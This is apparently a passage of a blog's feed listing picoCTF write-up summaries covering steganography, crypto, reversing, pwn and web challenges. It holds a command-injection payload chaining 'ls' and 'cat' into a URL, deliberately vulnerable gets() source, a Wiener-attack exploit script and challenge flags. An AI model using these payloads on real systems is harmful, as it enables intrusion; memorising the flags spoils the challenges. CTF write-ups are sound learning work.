Exploit - strings + rot13 $ strings shark1.pcapng | grep "{" ... Gur synt vf cvpbPGS{c33xno00_1_f33_h_qrnqorrs} ... Obviously a encrypted flag $\to$ use rot13 flag: picoCTF{p33kab00_1_s33_u_deadbeef}</description></item><item><title>PicoCTF - advanced-potion-making</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/image-stego/picoctf---advanced-potion-making/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/image-stego/picoctf---advanced-potion-making/index.html</guid><description>PicoCTF - advanced-potion-making tags: PicoCTF CTF Misc Challenge: advanced-potion-making
Background PNG文件格式详解 隐写分析(2) PNG图片隐写
Exploit - Recover + StegSolve Modify the file signature and length to the right value. 89 50 42 11 0D 0A 1A 0A 00 12 13 14 49 48 44 52 $\to$ 89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52</description></item><item><title>PicoCTF - AES-ABC</title><link>https://bernie6401.github.io/security/practice/picoctf/crypto/des-aes/picoctf---aes-abc/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/crypto/des-aes/picoctf---aes-abc/index.html</guid><description>PicoCTF - AES-ABC tags: PicoCTF CTF Crypto Background What is PPM file?
Source code :::spoiler Source Code
#!/usr/bin/env python from Crypto.Cipher import AES from key import KEY import os import math BLOCK_SIZE = 16 UMAX = int(math.pow(256, BLOCK_SIZE)) def to_bytes(n): s = hex(n) s_n = s[2:] if 'L' in s_n: s_n = s_n.replace('L', '') if len(s_n) % 2 != 0: s_n = '0' + s_n decoded = s_n.decode('hex') pad = (len(decoded) % BLOCK_SIZE) if pad != 0: decoded = "\0" * (BLOCK_SIZE - pad) + decoded return decoded def remove_line(s): # returns the header line, and the rest of the file return s[:s.index('\n') + 1], s[s.index('\n')+1:] def parse_header_ppm(f): data = f.read() header = "" for i in range(3): header_i, data = remove_line(data) header += header_i return header, data def pad(pt): padding = BLOCK_SIZE - len(pt) % BLOCK_SIZE return pt + (chr(padding) * padding) def aes_abc_encrypt(pt): cipher = AES.new(KEY, AES.MODE_ECB) ct = cipher.encrypt(pad(pt)) blocks = [ct[i * BLOCK_SIZE:(i+1) * BLOCK_SIZE] for i in range(len(ct) / BLOCK_SIZE)] iv = os.urandom(16) blocks.insert(0, iv) for i in range(len(blocks) - 1): prev_blk = int(blocks[i].encode('hex'), 16) curr_blk = int(blocks[i+1].encode('hex'), 16) n_curr_blk = (prev_blk + curr_blk) % UMAX blocks[i+1] = to_bytes(n_curr_blk) ct_abc = "".join(blocks) return iv, ct_abc, ct if __name__=="__main__": with open('flag.ppm', 'rb') as f: header, data = parse_header_ppm(f) iv, c_img, ct = aes_abc_encrypt(data) with open('body.enc.ppm', 'wb') as fw: fw.write(header) fw.write(c_img) :::</description></item><item><title>PicoCTF - ARMssembly 0</title><link>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---armssembly-0/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---armssembly-0/index.html</guid><description>PicoCTF - ARMssembly 0 Source code :::spoiler ARM assembly code
.arch armv8-a .file	"chall.c" .text .align	2 .global	func1 .type	func1, %function func1: sub	sp, sp, #16 str	w0, [sp, 12] str	w1, [sp, 8] ldr	w1, [sp, 12] ldr	w0, [sp, 8] cmp	w1, w0 bls	.L2 ldr	w0, [sp, 12] b	.L3 .L2: ldr	w0, [sp, 8] .L3: add	sp, sp, 16 ret .size	func1, .-func1 .section	.rodata .align	3 .LC0: .string	"Result: %ld\n" .text .align	2 .global	main .type	main, %function main: stp	x29, x30, [sp, -48]! add	x29, sp, 0 str	x19, [sp, 16] str	w0, [x29, 44] str	x1, [x29, 32] ldr	x0, [x29, 32] add	x0, x0, 8 ldr	x0, [x0] bl	atoi mov	w19, w0 ldr	x0, [x29, 32] add	x0, x0, 16 ldr	x0, [x0] bl	atoi mov	w1, w0 mov	w0, w19 bl	func1 mov	w1, w0 adrp	x0, .LC0 add	x0, x0, :lo12:.LC0 bl	printf mov	w0, 0 ldr	x19, [sp, 16] ldp	x29, x30, [sp], 48 ret .size	main, .-main .ident	"GCC: (Ubuntu/Linaro 7.5.0-3ubuntu1~18.04) 7.5.0" .section	.note.GNU-stack,"",@progbits :::</description></item><item><title>PicoCTF - asm4</title><link>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---asm4/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---asm4/index.html</guid><description>PicoCTF - asm4 Description What will asm4(“picoCTF_f97bb”) return? Submit the flag as a hexadecimal value (starting with ‘0x’). NOTE: Your submission for this question will NOT be in the normal flag format.
Source code :::spoiler Source Code
asm4: &lt;+0>:	push ebp &lt;+1>:	mov ebp,esp &lt;+3>:	push ebx &lt;+4>:	sub esp,0x10 &lt;+7>:	mov DWORD PTR [ebp-0x10],0x27a &lt;+14>:	mov DWORD PTR [ebp-0xc],0x0 &lt;+21>:	jmp 0x518 &lt;asm4+27> &lt;+23>:	add DWORD PTR [ebp-0xc],0x1 &lt;+27>:	mov edx,DWORD PTR [ebp-0xc] &lt;+30>:	mov eax,DWORD PTR [ebp+0x8] &lt;+33>:	add eax,edx &lt;+35>:	movzx eax,BYTE PTR [eax] &lt;+38>:	test al,al &lt;+40>:	jne 0x514 &lt;asm4+23> &lt;+42>:	mov DWORD PTR [ebp-0x8],0x1 &lt;+49>:	jmp 0x587 &lt;asm4+138> &lt;+51>:	mov edx,DWORD PTR [ebp-0x8] &lt;+54>:	mov eax,DWORD PTR [ebp+0x8] &lt;+57>:	add eax,edx &lt;+59>:	movzx eax,BYTE PTR [eax] &lt;+62>:	movsx edx,al &lt;+65>:	mov eax,DWORD PTR [ebp-0x8] &lt;+68>:	lea ecx,[eax-0x1] &lt;+71>:	mov eax,DWORD PTR [ebp+0x8] &lt;+74>:	add eax,ecx &lt;+76>:	movzx eax,BYTE PTR [eax] &lt;+79>:	movsx eax,al &lt;+82>:	sub edx,eax &lt;+84>:	mov eax,edx &lt;+86>:	mov edx,eax &lt;+88>:	mov eax,DWORD PTR [ebp-0x10] &lt;+91>:	lea ebx,[edx+eax*1] &lt;+94>:	mov eax,DWORD PTR [ebp-0x8] &lt;+97>:	lea edx,[eax+0x1] &lt;+100>:	mov eax,DWORD PTR [ebp+0x8] &lt;+103>:	add eax,edx &lt;+105>:	movzx eax,BYTE PTR [eax] &lt;+108>:	movsx edx,al &lt;+111>:	mov ecx,DWORD PTR [ebp-0x8] &lt;+114>:	mov eax,DWORD PTR [ebp+0x8] &lt;+117>:	add eax,ecx &lt;+119>:	movzx eax,BYTE PTR [eax] &lt;+122>:	movsx eax,al &lt;+125>:	sub edx,eax &lt;+127>:	mov eax,edx &lt;+129>:	add eax,ebx &lt;+131>:	mov DWORD PTR [ebp-0x10],eax &lt;+134>:	add DWORD PTR [ebp-0x8],0x1 &lt;+138>:	mov eax,DWORD PTR [ebp-0xc] &lt;+141>:	sub eax,0x1 &lt;+144>:	cmp DWORD PTR [ebp-0x8],eax &lt;+147>:	jl 0x530 &lt;asm4+51> &lt;+149>:	mov eax,DWORD PTR [ebp-0x10] &lt;+152>:	add esp,0x10 &lt;+155>:	pop ebx &lt;+156>:	pop ebp &lt;+157>:	ret :::</description></item><item><title>PicoCTF - babygame01</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---babygame01/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---babygame01/index.html</guid><description>PicoCTF - babygame01 Background Bof
Description &amp; Hint Get the flag and reach the exit. Welcome to BabyGame! Navigate around the map and see what you can find! The game is available to download here. There is no source available, so you’ll have to figure your way around the map. You can connect with it using nc saturn.picoctf.net 50227. Hint 1: Use ‘w’,‘a’,’s’,’d’ to move around. Hint 2: There may be secret commands to make your life easy.</description></item><item><title>PicoCTF - babygame02</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---babygame02/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---babygame02/index.html</guid><description>PicoCTF - babygame02 Source :::spoiler IDA Main Function
int __cdecl main(int argc, const char **argv, const char **envp) { int position[2]; // [esp+0h] [ebp-AA0h] BYREF char map[2700]; // [esp+Bh] [ebp-A95h] BYREF char input; // [esp+A97h] [ebp-9h] int *p_argc; // [esp+A98h] [ebp-8h] p_argc = &amp;argc; init_player(position); init_map(map, position); print_map(map); signal(2, sigint_handler); do { do { input = getchar(); move_player(position, input, map); print_map(map); } while ( position[0] != 29 ); // y座標 } while ( position[1] != 89 ); // x座標 puts("You win!"); return 0; } ::: :::spoiler IDA Win Function</description></item><item><title>PicoCTF - buffer overflow 2</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---buffer-overflow-2/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---buffer-overflow-2/index.html</guid><description>PicoCTF - buffer overflow 2 Background Bof
Source code :::spoiler Source Code
#include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;string.h> #include &lt;unistd.h> #include &lt;sys/types.h> #define BUFSIZE 100 #define FLAGSIZE 64 void win(unsigned int arg1, unsigned int arg2) { char buf[FLAGSIZE]; FILE *f = fopen("flag.txt","r"); if (f == NULL) { printf("%s %s", "Please create 'flag.txt' in this directory with your", "own debugging flag.\n"); exit(0); } fgets(buf,FLAGSIZE,f); if (arg1 != 0xCAFEF00D) return; if (arg2 != 0xF00DF00D) return; printf(buf); } void vuln(){ char buf[BUFSIZE]; gets(buf); puts(buf); } int main(int argc, char **argv){ setvbuf(stdout, NULL, _IONBF, 0); gid_t gid = getegid(); setresgid(gid, gid, gid); puts("Please enter your string: "); vuln(); return 0; } :::</description></item><item><title>PicoCTF - c0rrupt</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/image-stego/picoctf---c0rrupt/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/image-stego/picoctf---c0rrupt/index.html</guid><description>PicoCTF - c0rrupt tags: PicoCTF CTF Misc Challenge: c0rrupt
Background advanced-potion-making:two::+1:
Exploit - Recover PNG file Analyze Header 89 65 4E 34 0D 0A B0 AA $\to$ 89 50 4E 47 0D 0A 1A 0A
IHDR 43 22 44 52 $\to$ 49 48 44 52 Then use pngcheck to analyze the file. It said the header still have some error.
$ pngcheck mystery mystery CRC error in chunk pHYs (computed 38d82c82, expected 495224f0) ERROR: mystery Revise pHYs You can open an arbitrary png file and observe pHYs part.</description></item><item><title>PicoCTF - caas</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---caas/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---caas/index.html</guid><description>PicoCTF - caas tags: PicoCTF CTF Web Background Command Injection
Source code const express = require('express'); const app = express(); const { exec } = require('child_process'); app.use(express.static('public')); app.get('/cowsay/:message', (req, res) => { exec(`/usr/games/cowsay ${req.params.message}`, {timeout: 5000}, (error, stdout) => { if (error) return res.status(500).end(); res.type('txt').send(stdout).end(); }); }); app.listen(3000, () => { console.log('listening'); }); Recon 直覺是command injection
Exploit - Easy Command Injection Payload: /cowsay/123;ls;cat falg.txt Flag: picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}
Reference CaaS | Web Category | PicoCTF | CTF For beginners</description></item><item><title>PicoCTF - Compress and Attack</title><link>https://bernie6401.github.io/security/practice/picoctf/crypto/picoctf---compress-and-attack/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/crypto/picoctf---compress-and-attack/index.html</guid><description>PicoCTF - Compress and Attack tags: PicoCTF CTF Crypto Background zlib compression property 詳細說明一下zlib的壓縮特性是當壓縮的內容出現重複字元的時候，壓縮過後的長度會不變 >>> import zlib >>> enc = zlib.compress(bytes("picoCTF{picoCTF{testing_123456}".encode("utf-8"))) >>> len(enc) 33 >>> enc = zlib.compress(bytes("picoCTF{tepicoCTF{testing_123456}".encode("utf-8"))) >>> len(enc) 33 >>> enc = zlib.compress(bytes("picoCTF{tekpicoCTF{testing_123456}".encode("utf-8"))) >>> len(enc) 34 此時重複的部分就是picoCTF{，若是繼續增加重複的部分(例如：picoCTF{te)，壓縮後的長度也不會變，這樣就可以當作一個oracle，也就是利用長度來判斷增加的字元是不是flag重複的一部分
Source code :::spoiler
#!/usr/bin/python3 -u import zlib from random import randint import os from Crypto.Cipher import Salsa20 flag = open("./flag").read() def compress(text): return zlib.compress(bytes(text.encode("utf-8"))) def encrypt(plaintext): secret = os.urandom(32) cipher = Salsa20.new(key=secret) return cipher.nonce + cipher.encrypt(plaintext) def main(): while True: usr_input = input("Enter your text to be encrypted: ") compressed_text = compress(flag + usr_input) encrypted = encrypt(compressed_text) nonce = encrypted[:8] encrypted_text = encrypted[8:] print(nonce) print(encrypted_text) print(len(encrypted_text)) if __name__ == '__main__': main() :::</description></item><item><title>PicoCTF - Cookies</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---cookies/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---cookies/index.html</guid><description>PicoCTF - Cookies tags: PicoCTF CTF Web Challenge: http://mercury.picoctf.net:64944/
Background curl 的用法指南
-H參數添加 HTTP 請求的標頭。 $ curl -H 'Accept-Language: en-US' https://google.com
-s參數將不輸出錯誤和進度信息。 $ curl -s https://www.example.com
-L參數會讓 HTTP 請求跟隨服務器的重定向。curl 默認不跟隨重定向。 $ curl -L -d 'tweet=hi' https://api.twitter.com/tweet
-I參數向服務器發出 HEAD 請求，然會將服務器返回的 HTTP 標頭打印出來。 $ curl -I https://www.example.com
Exploit Try to analyze When I input something, it’ll redirect to another page I tried to change cookie to different number and also modify the different value of name parameter however, still got wrong information.</description></item><item><title>PicoCTF - corrupt-key-1</title><link>https://bernie6401.github.io/security/practice/picoctf/crypto/rsa/picoctf---corrupt-key-1/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/crypto/rsa/picoctf---corrupt-key-1/index.html</guid><description>PicoCTF - corrupt-key-1 tags: PicoCTF CTF Crypto Source code private.key -----BEGIN RSA PRIVATE KEY----- MIICXAIBAAKBgQC4yxzKmbasQYdsGIRXMqXL/Idd80bukALOYIUItfz2tgpax3Iq LWTvdOFEOjOOcKc+Y6MD86ya3xmFlWmfbp8wwAnSGcfZjE7IQgNhCDQCnHlWfvwI 9mtLw/Vkv7VxVGoGt+SPs1u5zOqaLNRDSfgpJCB436ZNUlknv9VdCZwCTwIDAQAB AoGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACQQDnAFaP9Qa9WJKv klkhJeBsvpvUXf6v6TGjM8E0YwI9TwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAkEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJBAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACQAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAACQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA= -----END RSA PRIVATE KEY----- msg.enc 71dc d160 9ac4 a05c d14f 04a9 b43c 2aa3 83d2 a8d6 749b b978 75d5 437a a944 45f2 4073 f605 ef1c 5657 8d0e 7a2d f3be b5c1 7741 8476 0b3d 44fc b97e 6631 b6fe 2487 6258 d445 a7d7 4c7c e3cc 00ec f925 f442 c91d 10c9 cefb 9ca6 9c88 da3c 9d26 6c96 9033 63d5 6a13 7b64 1fc3 8709 2416 f7fb eb4c 4c94 cc8e 157f cc0e d122 159c 27d5 Recon 可見private.key的內文被corrupted了，必須要修復才能夠解密ciphertext，但看來看去也找不到相關的write up，或是修復的方法，從連結這篇write up也看不懂如何修復，雖然他有附上code，但是很多error也無法debug(主要是看不懂)，總而言之我們的目標就是找出$p$為何</description></item><item><title>PicoCTF - Dachshund Attacks</title><link>https://bernie6401.github.io/security/practice/picoctf/crypto/rsa/picoctf---dachshund-attacks/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/crypto/rsa/picoctf---dachshund-attacks/index.html</guid><description>PicoCTF - Dachshund Attacks tags: PicoCTF CTF Crypto Background How about if the private key is too small? Refer Extending Wiener’s Attack Exploit - Small Private Key git clone https://github.com/pablocelayes/rsa-wiener-attack Put the exploit file in this repo. Whole Exploit from pwn import * from Crypto.Util.number import long_to_bytes import ContinuedFractions, Arithmetic context.arch = 'amd64' r = remote("mercury.picoctf.net", 37455) def wiener_hack(e, n): # firstly git clone https://github.com/pablocelayes/rsa-wiener-attack.git ! frac = ContinuedFractions.rational_to_contfrac(e, n) convergents = ContinuedFractions.convergents_from_contfrac(frac) for (k, d) in convergents: if k != 0 and (e * d - 1) % k == 0: phi = (e * d - 1) // k s = n - phi + 1 discr = s * s - 4 * n if (discr >= 0): t = Arithmetic.is_perfect_square(discr) if t != -1 and (s + t) % 2 == 0: print("Hacked!") return d return False r.recvline() e = int(str(r.recvline().strip().decode()).split(" ")[-1]) n = int(str(r.recvline().strip().decode()).split(" ")[-1]) c = int(str(r.recvline().strip().decode()).split(" ")[-1]) d = wiener_hack(e, n) print(long_to_bytes(pow(c, d, n))) r.interactive() Reference CTF_RSA解密学习指南(三) - 低解密指数攻击</description></item><item><title>PicoCTF - Disk, disk, sleuth! II</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/disk/picoctf---disk-disk-sleuth-ii/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/disk/picoctf---disk-disk-sleuth-ii/index.html</guid><description>PicoCTF - Disk, disk, sleuth! II tags: PicoCTF CTF Misc Challenge: Disk, disk, sleuth! II
Description &amp; Hint All we know is the file with the flag is named down-at-the-bottom.txt… Disk image: dds2-alpine.flag.img.gz Hint 1: The sleuthkit has some great tools for this challenge as well. Hint 2: Sleuthkit docs here are so helpful: TSK Tool Overview Hint 3: This disk can also be booted with qemu!
Background Linux安装、使用Sleuth kit/Autopsy
Exploit - Use Autopsy Tool to analyze In root folder. :::spoiler flag</description></item><item><title>PicoCTF - dont-use-client-side</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---dont-use-client-side/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---dont-use-client-side/index.html</guid><description>PicoCTF - dont-use-client-side tags: PicoCTF CTF Web Challenge: dont-use-client-side
Exploit - Page source code picoCTF{no_clients_plz_b706c5}</description></item><item><title>PicoCTF - Double DES</title><link>https://bernie6401.github.io/security/practice/picoctf/crypto/des-aes/picoctf---double-des/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/crypto/des-aes/picoctf---double-des/index.html</guid><description>PicoCTF - Double DES tags: PicoCTF CTF Crypto Background Meet in the middle attack Source code :::spoiler
#!/usr/bin/python3 -u from Crypto.Cipher import DES import binascii import itertools import random import string def pad(msg): block_len = 8 over = len(msg) % block_len pad = block_len - over return (msg + " " * pad).encode() def generate_key(): return pad("".join(random.choice(string.digits) for _ in range(6))) FLAG = open("flag").read().rstrip() KEY1 = generate_key() KEY2 = generate_key() def get_input(): try: res = binascii.unhexlify(input("What data would you like to encrypt? ").rstrip()).decode() except: res = None return res def double_encrypt(m): msg = pad(m) cipher1 = DES.new(KEY1, DES.MODE_ECB) enc_msg = cipher1.encrypt(msg) cipher2 = DES.new(KEY2, DES.MODE_ECB) return binascii.hexlify(cipher2.encrypt(enc_msg)).decode() print("Here is the flag:") print(double_encrypt(FLAG)) while True: inputs = get_input() if inputs: print(double_encrypt(inputs)) else: print("Invalid input.") :::</description></item><item><title>PicoCTF - droids1</title><link>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---droids1/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---droids1/index.html</guid><description>PicoCTF - droids1 Backgroud Android App 逆向入門之一：拆開與重組 apk : 強烈建議新手在打之前可以先看一下這篇，稍微了解一下整體怎麼包apk以及比要檔案有哪些，或是他們儲存的資料類型之類的
Tools apktool 跟著installation guide就可以安裝成功，此工具目的在於拆解apk，我們知道apk就是一個壓縮檔，如果直接用unzip這種指令，也可以打開，只不過一些經過編譯後的byte code就還是byte code，而apktool可以在解壓縮的同時還原這些byte code Android Studio: 此工具目的在於利用emulator把該軟體安裝後跑起來 JADX: 和ApkTool一樣，可以反編譯apk，但有GUI(Recommended) $ wget https://github.com/skylot/jadx/releases/download/v1.1.0/jadx-1.1.0.zip $ unzip jadx-1.1.0.zip -d jadx $ cd jadx $ cd ./bin $ ./jadx-gui Recon 這一題有兩種方法可以反編譯apk，一種是利用ApkTool，另外一個是JADX，兩者差在有無GUI(JADX有)，主要是參考1的WP
Exploit ApkTools $ apktool d one.apk I: Using Apktool 2.8.1 on one.apk I: Loading resource table... I: Decoding AndroidManifest.xml with resources... I: Loading resource table from file: C:\Users\Bernie\AppData\Local\apktool\framework\1.apk I: Regular manifest package... I: Decoding file-resources... I: Decoding values */* XMLs... I: Baksmaling classes.dex... I: Copying assets and libs... I: Copying unknown files... I: Copying original files... 如果有按照上面的guide把apktool裝起來，就可以直接下指令，參數d代表decode，對於比較熟Android架構的人來說應該綽綽有餘，畢竟要到哪邊找code/strings之類的，通常都會是那幾個地方，例如： Code會放在./smali/com/hellocmu/picoctf/(PS: 只不過code很醜，畢竟是smali) Strings會放在./res/values/strings.xml</description></item><item><title>PicoCTF - droids3</title><link>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---droids3/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---droids3/index.html</guid><description>PicoCTF - droids3 Background Android App 逆向入門之一：拆開與重組 apk Android App 逆向入門之二：修改 smali 程式碼 Source code package com.hellocmu.picoctf; import android.content.Context; /* loaded from: classes.dex */ public class FlagstaffHill { public static native String cilantro(String str); public static String nope(String input) { return "don't wanna"; } public static String yep(String input) { return cilantro(input); } public static String getFlag(String input, Context ctx) { String flag = nope(input); return flag; } } Recon 利用前一題學到的工具(JADX)，先decompiler一下原本的程式在幹嘛(source code如上)，會發現getFlag這個method所呼叫的nope只會吐出don't wanna，而真正會print出flag的是yep這個method，所以我們可以修改一下，不過修改之前還是要知道一下流程 Apktool decode apk file$\to$修改必要的地方$\to$Apktool重新打包$\to$簽名$\to$Align$\to$Done，這一個部分在 Android App 逆向入門之二：修改 smali 程式碼 有詳細的說明</description></item><item><title>PicoCTF - droids4</title><link>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---droids4/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---droids4/index.html</guid><description>PicoCTF - droids4 Background Android App 逆向入門之一：拆開與重組 apk Android App 逆向入門之二：修改 smali 程式碼 Source code package com.hellocmu.picoctf; import android.content.Context; /* loaded from: classes.dex */ public class FlagstaffHill { public static native String cardamom(String str); public static String getFlag(String input, Context ctx) { StringBuilder ace = new StringBuilder("aaa"); StringBuilder jack = new StringBuilder("aaa"); StringBuilder queen = new StringBuilder("aaa"); StringBuilder king = new StringBuilder("aaa"); ace.setCharAt(0, (char) (ace.charAt(0) + 4)); ace.setCharAt(1, (char) (ace.charAt(1) + 19)); ace.setCharAt(2, (char) (ace.charAt(2) + 18)); jack.setCharAt(0, (char) (jack.charAt(0) + 7)); jack.setCharAt(1, (char) (jack.charAt(1) + 0)); jack.setCharAt(2, (char) (jack.charAt(2) + 1)); queen.setCharAt(0, (char) (queen.charAt(0) + 0)); queen.setCharAt(1, (char) (queen.charAt(1) + 11)); queen.setCharAt(2, (char) (queen.charAt(2) + 15)); king.setCharAt(0, (char) (king.charAt(0) + 14)); king.setCharAt(1, (char) (king.charAt(1) + 20)); king.setCharAt(2, (char) (king.charAt(2) + 15)); String password = "".concat(queen.toString()).concat(jack.toString()).concat(ace.toString()).concat(king.toString()); return input.equals(password) ? "call it" : "NOPE"; } } Recon 基本上用眼睛看應該看的出來password是啥，不過他最後只會print出call it或是NOPE，所以我們要像上一題一樣改造一下smali，可以對照一下前一題的smali是怎麼call的</description></item><item><title>PicoCTF - Easy as GDB</title><link>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---easy-as-gdb/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---easy-as-gdb/index.html</guid><description>PicoCTF - Easy as GDB Source code :::spoiler IDA Main Function
int __cdecl main(int argc, const char **argv, const char **envp) { char *str_len; // eax int v5; // [esp-8h] [ebp-20h] int v6; // [esp-4h] [ebp-1Ch] char *input_flag; // [esp+4h] [ebp-14h] size_t str_len_1; // [esp+8h] [ebp-10h] char *src; // [esp+Ch] [ebp-Ch] input_flag = calloc(0x200u, 1u); printf("input the flag: "); fgets(input_flag, 512, stdin); str_len = strnlen(aZNh, 512, v5, v6); src = enc_input(str_len, str_len); sub_7C2(src, 1, 1); if ( check_flag(src, str_len_1) == 1 ) puts("Correct!"); else puts("Incorrect."); return 0; } :::</description></item><item><title>PicoCTF - Easy Peasy</title><link>https://bernie6401.github.io/security/practice/picoctf/crypto/classic/picoctf---easy-peasy/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/crypto/classic/picoctf---easy-peasy/index.html</guid><description>PicoCTF - Easy Peasy tags: PicoCTF CTF Crypto Challenge: Easy Peasy
Background Source code :::spoiler source code
#!/usr/bin/python3 -u import os.path KEY_FILE = "key" KEY_LEN = 50000 FLAG_FILE = "flag" def startup(key_location): flag = open(FLAG_FILE).read() kf = open(KEY_FILE, "rb").read() start = key_location stop = key_location + len(flag) key = kf[start:stop] key_location = stop result = list(map(lambda p, k: "{:02x}".format(ord(p) ^ k), flag, key)) print("This is the encrypted flag!\n{}\n".format("".join(result))) return key_location def encrypt(key_location): ui = input("What data would you like to encrypt? ").rstrip() if len(ui) == 0 or len(ui) > KEY_LEN: return -1 start = key_location stop = key_location + len(ui) kf = open(KEY_FILE, "rb").read() if stop >= KEY_LEN: stop = stop % KEY_LEN key = kf[start:] + kf[:stop] else: key = kf[start:stop] key_location = stop result = list(map(lambda p, k: "{:02x}".format(ord(p) ^ k), ui, key)) print("Here ya go!\n{}\n".format("".join(result))) return key_location print("******************Welcome to our OTP implementation!******************") c = startup(0) while c >= 0: c = encrypt(c) :::</description></item><item><title>PicoCTF - Easy Peasy Or Bad Questions</title><link>https://bernie6401.github.io/security/practice/picoctf/bad-questions/picoctf---easy-peasy-or-bad-questions/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/bad-questions/picoctf---easy-peasy-or-bad-questions/index.html</guid><description>PicoCTF - Easy Peasy Or Bad Questions [TOC]
Challenge: logon🍰 Exploit - Set cookie Challenge: where are the robots🍰 Exploit - robots.txt Payload: https://jupiter.challenges.picoctf.org/problem/56830/robots.txt Payload: https://jupiter.challenges.picoctf.org/problem/56830/1bb4c.html Challenge: Packets Primer🍰 Exploit - search { string directly</description></item><item><title>PicoCTF - Eavesdrop</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/flow/picoctf---eavesdrop/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/flow/picoctf---eavesdrop/index.html</guid><description>PicoCTF - Eavesdrop Recon 這一題是有關eavesdropping，代表有一個中間人監聽了所有conversation，先用一些基本的手段看一下整體的pcap packets(strings searching/IO Graphs/Statistic/Extract Default Protocol File…)，但是如果跟一下tcp的packets，可以發現傳輸兩方的對話紀錄，包括傳輸資料的加密方式等等，所以我們就可以直接把傳輸資料解密得到flag
